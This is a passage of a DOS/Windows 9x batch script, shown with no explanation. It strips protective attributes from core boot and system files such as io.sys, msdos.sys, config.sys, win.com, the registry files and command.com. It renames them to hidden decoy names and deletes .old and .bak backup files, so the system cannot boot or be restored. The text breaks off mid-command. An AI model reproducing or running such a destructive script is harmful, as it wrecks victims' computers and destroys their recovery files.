@echo off
attrib -h -r -s c:\windows\user.dat
ren c:\windows\user.dat noreg.rom
attrib +h +r +s c:\windows\noreg.rom
attrib -h -r -s c:\windows\system.dat
ren c:\windows\system.dat extra.rom
attrib +h +r +s c:\windows\extra.rom
attrib -h -r -s c:\io.sys
ren c:\io.sys tu.non
attrib +h +r +s c:\tu.non
attrib -h -r -s c:\windows\win.com
ren c:\windows\win.com lose.net
attrib +h +r +s c:\windows\lose.net
attrib -h -r -s c:\autoexec.bat
ren c:\autoexec.bat quick.cat
attrib +h +r +s c:\quick.cat
attrib -h -r -s c:\windows\himem.sys
ren c:\windows\himem.sys Lowmem.non
attrib +h +r +s c:\windows\lowmem.non
attrib -h -r -s c:\msdos.sys
ren c:\msdos.sys msmild.non
attrib +h +r +s c:\msmild.non
attrib -h -r -s c:\config.sys
ren c:\config.sys senzcaz.non
attrib +h +r +s c:\senzcaz.non
attrib -h -r -s c:\windows\command\ebd\himem.sys 
ren c:\windows\command\ebd\himem.sys lowmem.non
attrib +h +r +s c:\windows\command\ebd\lowmem.non
attrib -h -r -s c:\windows\command\ebd\config.sys
ren c:\windows\command\ebd\config.sys senzcaz.non
attrib +h +r +s c:\windows\command\ebd\senzcaz.non
attrib -h -r -s c:\windows\command\ebd\io.sys
ren c:\windows\command\ebd\io.sys tu.non
attrib +h +r +s c:\windows\command\ebd\tu.non
attrib -h -r -s c:\windows\rundll.exe
ren c:\windows\rundll.exe slowsys.inx
attrib +h +r +s c:\windows\slowsys.inx
attrib -h -r -s c:\windows\rundll32.exe
ren c:\windows\rundll32.exe slowsys8.inx
attrib +h +r +s c:\windows\slowsys8.inx
attrib -h -r -s c:\*.old
del c:\*.old
attrib -h -r -s c:\windows\*.old
del c:\windows\*.old
attrib -h -r -s c:\*.bak
del c:\*.bak
attrib -h -r -s c:\windows\*.bak
del c:\windows\*.bak
attrib -h -r -s c:\windows\command\ebd\command.com
ren c:\windows\command\ebd\command.com netor.net
attrib +h +r +s c:\windows\command\ebd\netor.net
attrib -h -r -s c:\windows\command.com
re